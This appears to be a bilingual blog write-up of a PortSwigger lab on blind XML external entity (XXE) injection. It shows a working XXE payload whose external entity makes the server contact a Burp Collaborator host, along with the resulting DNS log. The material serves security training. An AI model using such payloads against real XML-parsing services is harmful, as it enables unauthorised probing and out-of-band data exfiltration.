---
layout: post
title: "Blind XXE with out-of-band interaction"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_XXE
author: ""
tags: ['PortSwigger_Lab', 'XXE']
---





# Blind XXE with out-of-band interaction


w3schools.com:
https://www.w3schools.com/xml/xml_dtd_entities.asp


```

This lab has a "Check stock" feature that parses XML input but does not display the result.

You can detect the [blind XXE](https://portswigger.net/web-security/xxe/blind) vulnerability by triggering out-of-band interactions with an external domain.

To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

#### Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.



這個實驗室有一個“檢查庫存”功能，它解析 XML 輸入但不顯示結果。

您可以通過觸發與外部域的帶外交互來檢測盲 XXE 漏洞。

要解決實驗室問題，請使用外部實體使 XML 解析器向 Burp Collaborator 發出 DNS 查找和 HTTP 請求。
筆記

為了防止 Academy 平台被用於攻擊第三方，我們的防火牆阻止了實驗室與任意外部系統之間的交互。 要解決實驗室，您必須使用 Burp Collaborator 的默認公共服務器。





```


意思就是顯示不了，所以用代外攻擊來看是否有xxe漏洞。









官方給的payload
```xml
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
```



collaborator server:
```
ssofwofql88rhdo78vjcxdlae1kt8i.burpcollaborator.net

```


修改
```xml


<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://ssofwofql88rhdo78vjcxdlae1kt8i.burpcollaborator.net"> ]>

<stockcheck>
	<productid>&xxe;</productid>
	<storeid>1</storeid>
</stockcheck>

```



collaborator client:
```
The Collaborator server received a DNS lookup of type A for the domain name ssofwofql88rhdo78vjcxdlae1kt8i.burpcollaborator.net.  The lookup was received from IP address 34.245.82.18 at 2022-10.-12 09:00:26 UTC.

```


成功